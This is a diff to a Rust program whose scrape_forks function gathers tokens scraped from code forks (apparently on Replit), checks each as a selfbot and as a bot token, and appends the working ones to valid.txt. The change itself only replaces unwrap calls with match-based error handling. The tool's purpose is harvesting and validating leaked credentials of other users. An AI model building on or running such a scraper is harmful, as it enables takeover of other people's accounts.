@@ -71,31 +71,44 @@ async fn scrape_forks() {
         tokens.append(&mut token);
     }
     // Check Selfbot tokens
-    let mut file_writer = OpenOptions::new()
+    let file_writer = OpenOptions::new()
         .create(true)
         .append(true)
         .open("valid.txt")
-        .await.unwrap();
-    file_writer.write_all(format!("Self:\n").as_bytes()).await.unwrap();
-    let mut futs = FuturesUnordered::new();
-    for token in tokens.clone() {
-        futs.push(repl.self_check_tokens(client.clone(), token.clone()));
+        .await;
+    match file_writer {
+        Ok(mut file_writer) => {
+            file_writer.write_all(format!("Self:\n").as_bytes()).await.unwrap();
+            let mut futs = FuturesUnordered::new();
+            for token in tokens.clone() {
+                futs.push(repl.self_check_tokens(client.clone(), token.clone()));
+            }
+            while let Some(_) = futs.next().await {}
+        },
+        Err(e) => panic!("Could not create file write object, Error: {e}")
     }
-    while let Some(_) = futs.next().await {}
+
 
     // Check Bot tokens
-    let mut file_writer = OpenOptions::new()
+    let file_writer = OpenOptions::new()
         .create(true)
         .append(true)
         .open("valid.txt")
-        .await.unwrap();
-    file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
-    let mut futs = FuturesUnordered::new();
-    for token in tokens {
-        futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
+        .await;
+    match file_writer {
+        Ok(mut file_writer) => {
+            file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
+            let mut futs = FuturesUnordered::new();
+            for token in tokens {
+                futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
+            }
+            while let Some(_) = futs.next().await {}
+        println!("Finished");
+        },
+        Err(e) => panic!("Could not create file write object, Error: {e}")
     }
-    while let Some(_) = futs.next().await {}
-    println!("Finished");
+
+
 }
 
 
